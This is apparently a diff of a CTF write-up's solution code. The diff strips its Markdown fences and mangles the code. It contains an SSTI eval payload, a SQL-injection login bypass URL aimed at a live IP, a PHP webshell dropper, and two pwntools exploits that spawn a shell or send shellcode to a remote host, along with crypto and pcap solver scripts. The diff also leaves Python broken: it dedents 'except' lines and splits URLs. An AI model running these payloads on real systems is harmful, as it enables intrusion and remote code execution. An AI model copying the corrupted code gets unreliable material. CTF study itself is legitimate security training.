@@ -38,28 +38,15 @@ END
 
 ```
 {{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('head+u002fu0066u006cu0061u0067u0066u0031u0034u0039').read()")}}
-```
-
-
-
-```
 var express =require('express');var app =express();// 需要创建 express 实例var router = express.Router();// 创建路由实例router.get('/',(req, res, next)=>{  if(req.query.info){    if(req.url.match(/,/ig)){      res.end('hacker1!');    }    var info =JSON.parse(req.query.info);    console.log('Received info:', info);    if(info.username&& info.password){      var username = info.username;      var password = info.password;      if(info.username.match(/'|"|\/)|| info.password.match(/'|"|\/)){        res.end('hacker2!');      }      var sql ="select * from userinfo where username = '{username}' and password = '{password}'";      sql = sql.replace("{username}", username);      sql = sql.replace("{password}", password);      console.log('Received sql:', sql);      connection.query(sql,function(err, rs){        if(err){          res.end('error1');        }else{          if(rs.length>0){            res.sendFile('/flag');          }else{            res.end('username or password error');          }        }      });    }else{      res.end("please input the data");    }  }else{    res.end("please input the data");  }});// 绑定路由app.use('/', router);const port =3000;// 启动服务器app.listen(port,()=>{  console.log(`Server is running at http://localhost:${port}`);});
-```
-
-
-
-```
-http://139.155.126.78:18056/?info={"username":"$` or 1=1%23"&info="password":"123"}
-```
-
-
-
-```
+http://139.155.126.78:
+18056/?info={"username":"$` or 1=1%23"&info="password":"123"}
 import aiohttp
 import asyncio
 import re
 
-BASE_URL = "http://139.155.126.78:22542/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0"
+BASE_URL = "http://139.155.126.78:
+22542/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0"
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
 }
@@ -74,7 +61,8 @@ async def find_php_route(session, base_url):
                 matches = re.findall(r'href="([^"]+.php)"', html)
                 return matches if matches else []
             return []
-    except Exception as e:
+    
+except Exception as e:
         print(f"Error finding PHP routes: {e}")
         return []
 
@@ -92,7 +80,8 @@ async def check_php_file(session, file_url):
             else:
                 print(f"Failed to access: {file_url} (status code: {response.status})")
                 return False
-    except Exception as e:
+    
+except Exception as e:
         print(f"Error accessing {file_url}: {e}")
         return False
 
@@ -120,11 +109,6 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-```
-
-
-
-```
 <?php
     $folder = "Uploads/127.0.0.1/";
     if (!is_dir($folder)) {
@@ -135,11 +119,6 @@ if __name__ == "__main__":
     file_put_contents($filename, $content);
     echo "File $filename has been created with webshell content in folder $folder.";
 ?>
-```
-
-
-
-```
 from pwn import*
 
 def bug():
@@ -170,9 +149,9 @@ def get_hook():
 
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
-#libc = ELF('./libc.so.6')
+    #libc = ELF('./libc.so.6')
 elf=ELF('./pwn1')
-#p=remote('139.155.126.78',25416)
+    #p=remote('139.155.126.78',25416)
 p = process('./pwn1')
 def cmd(i):
     rl("Enter your choice: ")
@@ -217,15 +196,10 @@ update_entry(22,split_data(bin_sh,0))
 update_entry(23,split_data(bin_sh,1))
 update_entry(24,split_data(system,0))
 update_entry(25,split_data(system,1))
-#bug()
+    #bug()
 cmd(5)
 
 inter()
-```
-
-
-
-```
 from pwn import*
 from ae64 import AE64
 
@@ -235,7 +209,7 @@ def bug():
 
 context(os='linux',arch='amd64',log_level='debug')
 io=remote('139.155.126.78',30794)
-#io = process('./pwn')
+    #io = process('./pwn')
 
 payload=asm('''    
     mov rax, 0x67616c662f2e
@@ -257,14 +231,9 @@ payload=asm('''    
     pop rax
     syscall
     ''')
-#bug()
+    #bug()
 io.sendlineafter("MADE IN HEAVEN !!!!!!!!!!!!!!!!",payload)
 io.interactive()
-```
-
-
-
-```
 from gmpy2 import *
 from Crypto.Util.number import *
 
@@ -281,11 +250,6 @@ print(p)
 """
 12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063
 """
-```
-
-
-
-```
 from Crypto.Util.number import *
 from sympy import *
 from sage.all import *
@@ -315,17 +279,7 @@ for row in M:
     for value in row:
         flag += str(long_to_bytes(int(value)))
 print(flag)
-```
-
-
-
-```
 tshark -r filter1.pcapng -T fields -e http.request.uri.query.parameter -e json.object -E separator=, > extracted_data.txt
-```
-
-
-
-```
 import json
 import csv
 import os
@@ -371,7 +325,8 @@ with open(sign_data_file, newline='', encoding='utf-8') as csvfile:
             try:
                 signer.verify(name_hash, name_signature)
                 print(f"用户 {userid} 的 name 验证通过")
-            except ValueError:
+            
+except ValueError:
                 print(f"用户 {userid} 的 name 验证失败")
                 altered_data.append({
                     'userid': userid,
@@ -385,7 +340,8 @@ with open(sign_data_file, newline='', encoding='utf-8') as csvfile:
             try:
                 signer.verify(idcard_hash, idcard_signature)
                 print(f"用户 {userid} 的 idcard 验证通过")
-            except ValueError:
+            
+except ValueError:
                 print(f"用户 {userid} 的 idcard 验证失败")
                 altered_data.append({
                     'userid': userid,
@@ -399,7 +355,8 @@ with open(sign_data_file, newline='', encoding='utf-8') as csvfile:
             try:
                 signer.verify(phone_hash, phone_signature)
                 print(f"用户 {userid} 的 phone 验证通过")
-            except ValueError:
+            
+except ValueError:
                 print(f"用户 {userid} 的 phone 验证失败")
                 altered_data.append({
                     'userid': userid,
@@ -423,11 +380,6 @@ with open(altered_file, 'w', newline='', encoding='utf-8') as csvfile:
             'idcard': row['idcard'],
             'phone': row['phone']
         })
-```
-
-
-
-```
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 
@@ -464,11 +416,6 @@ with open('decrypted_data.csv', 'wb') as f:
     f.write(decrypted_data)
 
 print("Successfully decrypted data")
-```
-
-
-
-```
 import base64
 import pandas as pd
 from Crypto.Cipher import ARC4
